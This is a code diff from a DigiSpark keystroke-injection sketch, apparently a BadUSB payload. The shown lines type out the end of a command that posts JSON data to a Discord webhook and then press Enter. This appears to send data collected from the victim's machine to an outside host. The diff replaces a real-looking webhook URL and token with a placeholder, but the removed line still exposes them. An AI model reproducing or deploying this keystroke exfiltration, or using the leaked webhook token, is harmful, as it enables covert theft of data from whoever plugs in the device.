@@ -45,7 +45,7 @@ void setup() {
     DigiKeyboard.delay(500);
 
     // Close JSON and send request
-    DigiKeyboard.print("\\\"}\" \"https://discord.com/api/webhooks/1341299046094209105/cUFsKop8wOufYDkV3zQyeAhmDAjHaNZDlWqjxUSmAasbA0Jgyukd2KZ2rLCvSYeeHFxu\"");
+    DigiKeyboard.print("\\\"}\" \"https://discord.com/api/webhooks/<YOUR_WEBHOOK_ID>\"");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
